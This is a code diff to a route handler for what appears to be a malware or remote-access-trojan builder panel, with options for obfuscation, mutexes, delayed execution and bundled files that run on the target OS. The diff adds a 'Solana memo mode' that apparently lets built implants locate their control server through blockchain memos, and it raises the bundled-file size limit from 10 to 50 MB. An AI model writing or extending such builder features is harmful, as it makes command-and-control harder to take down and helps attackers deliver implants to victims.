@@ -49,6 +49,9 @@ export async function handleBuildRoutes(
         platforms,
         serverUrl,
         rawServerList,
+        solMemo,
+        solAddress,
+        solRpcEndpoints,
         stripDebug,
         disableCgo,
         obfuscate,
@@ -101,10 +104,19 @@ export async function handleBuildRoutes(
       }
 
       const safeRawServerList = !!rawServerList;
+      const safeSolMemo = !!solMemo;
       const safeServerUrl =
         typeof serverUrl === "string" && serverUrl.trim() !== ""
           ? serverUrl.trim()
           : undefined;
+
+      if (safeRawServerList && safeSolMemo) {
+        return Response.json(
+          { error: "Cannot enable both raw server list and Solana memo mode" },
+          { status: 400 },
+        );
+      }
+
       if (safeRawServerList) {
         if (!safeServerUrl) {
           return Response.json(
@@ -122,6 +134,46 @@ export async function handleBuildRoutes(
           }
         } catch {
           return Response.json({ error: "Invalid raw server list URL" }, { status: 400 });
+        }
+      }
+
+      let safeSolAddress: string | undefined;
+      let safeSolRpcEndpoints: string | undefined;
+      if (safeSolMemo) {
+        if (typeof solAddress !== "string" || !solAddress.trim()) {
+          return Response.json(
+            { error: "Solana memo mode requires a Solana address" },
+            { status: 400 },
+          );
+        }
+        const trimmedAddr = solAddress.trim();
+        if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(trimmedAddr)) {
+          return Response.json(
+            { error: "Invalid Solana address (must be Base58, 32-44 chars)" },
+            { status: 400 },
+          );
+        }
+        safeSolAddress = trimmedAddr;
+
+        if (typeof solRpcEndpoints === "string" && solRpcEndpoints.trim()) {
+          const endpoints = solRpcEndpoints.split("\n").map((e: string) => e.trim()).filter(Boolean);
+          for (const ep of endpoints) {
+            try {
+              const parsed = new URL(ep);
+              if (parsed.protocol !== "https:" && parsed.protocol !== "http:") {
+                return Response.json(
+                  { error: `Invalid RPC endpoint protocol: ${ep}` },
+                  { status: 400 },
+                );
+              }
+            } catch {
+              return Response.json(
+                { error: `Invalid RPC endpoint URL: ${ep}` },
+                { status: 400 },
+              );
+            }
+          }
+          safeSolRpcEndpoints = endpoints.join(",");
         }
       }
 
@@ -182,7 +234,7 @@ export async function handleBuildRoutes(
           ? sleepSeconds : 0;
 
       const MAX_BOUND_FILES = 5;
-      const MAX_BOUND_FILE_BYTES = 10 * 1024 * 1024;
+      const MAX_BOUND_FILE_BYTES = 50 * 1024 * 1024;
       const ALLOWED_BIND_TARGET_OS = new Set(["windows", "linux", "darwin"]);
       const RESERVED_BIND_NAMES = new Set(["manifest.json"]);
       type SafeBoundFile = { name: string; data: string; targetOS: string[]; execute: boolean };
@@ -214,7 +266,7 @@ export async function handleBuildRoutes(
           }
           const approxDecodedBytes = Math.floor(f.data.length * 3 / 4);
           if (approxDecodedBytes > MAX_BOUND_FILE_BYTES) {
-            return Response.json({ error: `Bound file '${safeName}' exceeds the 10 MB limit` }, { status: 400 });
+            return Response.json({ error: `Bound file '${safeName}' exceeds the 50 MB limit` }, { status: 400 });
           }
           const safeTargetOS = Array.isArray(f.targetOS)
             ? f.targetOS.filter((o: unknown) => typeof o === "string" && ALLOWED_BIND_TARGET_OS.has(o as string)) as string[]
@@ -233,6 +285,9 @@ export async function handleBuildRoutes(
         platforms: allowedPlatforms,
         serverUrl: safeServerUrl,
         rawServerList: safeRawServerList,
+        solMemo: safeSolMemo,
+        solAddress: safeSolAddress,
+        solRpcEndpoints: safeSolRpcEndpoints,
         mutex: safeMutex,
         disableMutex: safeDisableMutex,
         stripDebug,
